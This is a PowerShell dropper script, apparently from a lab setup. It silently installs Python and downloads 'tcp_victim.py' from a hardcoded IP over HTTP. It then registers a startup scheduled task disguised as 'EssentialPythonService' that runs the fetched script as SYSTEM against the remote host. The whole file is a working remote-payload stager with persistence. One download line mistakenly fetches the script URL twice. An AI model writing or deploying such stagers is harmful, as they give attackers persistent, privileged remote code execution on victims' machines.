
# Search the python executable
$pythonCommand = Get-Command python -ErrorAction SilentlyContinue

# If python executable is not found, install python
if (-not $pythonCommand) {
    # Define the URL for the Python installer
    $installerUrl = "https://www.python.org/ftp/python/3.12.4/python-3.12.4-amd64.exe"
    
    # Define the path for the downloaded installer
    $installerPath = "$env:TEMP\python_installer.exe"

    # Download the Python installer
    Write-Output "Downloading Python installer..."
    Invoke-WebRequest -Uri $installerUrl -OutFile $installerPath

    # Install Python silently
    Write-Output "Installing Python..."
    Start-Process -FilePath $installerPath -ArgumentList "/quiet InstallAllUsers=1 PrependPath=1" -NoNewWindow -Wait

    # Verify installation
    $pythonCommand = Get-Command python -ErrorAction SilentlyContinue
    if ($pythonCommand) {
        Write-Output "[!] Python installed successfully."
    } else {
        Write-Output "[x] Python installation failed."
    }

    # Clean up
    Remove-Item -Path $installerPath -Force
} else {
    Write-Output "[!] Python is already installed."
}

# Extract the directory path
$pythonPath = [System.IO.Path]::GetDirectoryName($pythonCommand.Source)
$pythonPath = "$pythonPath\python.exe"

## Option1: Download the python script from github
# $repoName = "xyz"
# $remoteRepository = "https://github.com/${repoName}"
# git clone $remoteRepository
## When the repository already exist in the system, simply update to latest version
# git pull      

## Option2: Download the python script from http repository
$remoteIP = "192.168.100.233"
$remotePort = 80
$remoteFile = "tcp_victim.py"
$requirementsFile = "requirements.txt"

$httpRepository = "http://${remoteIP}:${remotePort}"
$http1 = "$httpRepository/${remoteFile}"
$http2 = "$httpRepository/${requirementsFile}"

$outDirectory = "$env:TEMP"
$scriptPath = "${outDirectory}\script.py"
$requirementsPath = "${outDirectory}\${requirementsFile}"

# Try to make the web requests
try {
    Invoke-WebRequest -Uri $http1 -OutFile $scriptPath
    Invoke-WebRequest -Uri $http1 -OutFile $requirementsPath
    Write-Output "[!] Scripts downloaded successfully."

    # Install the Python packages from requirements.txt
    Write-Output "Installing Python packages..."
    & python -m pip install --upgrade pip *> $null
    & python -m pip install -r $requirementsPath *> $null

    Write-Output "[!] Python packages installed successfully."

} catch {
    # Check if the file already exists
    if (Test-Path -Path $scriptPath) {
        Write-Output "[!] The file already exists at $scriptPath."
    } else {
        Write-Output "[!] The file does not exist and could not be downloaded."
    }
}

# Call the downloaded script if exist
$targetPort = "45691"
if (Test-Path -Path $scriptPath) {
    # Start the Python script in the background
    #Start-Process -FilePath $pythonPath -ArgumentList @("$scriptPath", "$remoteIP", "$targetPort") -NoNewWindow -RedirectStandardOutput "${scriptPath}_log" -RedirectStandardError "${scriptPath}_ErrorLog"
    Write-Output "[!] Python script started in the background."
} else {
    Write-Output "[!] The script at $scriptPath does not exist. Cannot execute."
}

# Schedule Task for every startup
$TaskName = "EssentialPythonService"
$action = New-ScheduledTaskAction -Execute $pythonPath -Argument "`"$scriptPath`" `"$remoteIP`" $targetPort"

$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
$task = New-ScheduledTask -Action $action -Trigger $trigger -Settings $settings -Principal $principal
try{
    Register-ScheduledTask -TaskName "$TaskName" -InputObject $task -ErrorAction SilentlyContinue
} catch{    
    Write-Output "[!] Schedule $TaskName already exist!"
}

# Verify if the task was created successfully
$scheduledTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue

if ($scheduledTask) {
    Write-Output "[!] Task '$taskName' was created successfully."
    # Optional: Display detailed information about the task
    #$scheduledTask | Format-List *
} else {
    Write-Output "[!] Task '$taskName' could not be found or was not created."
}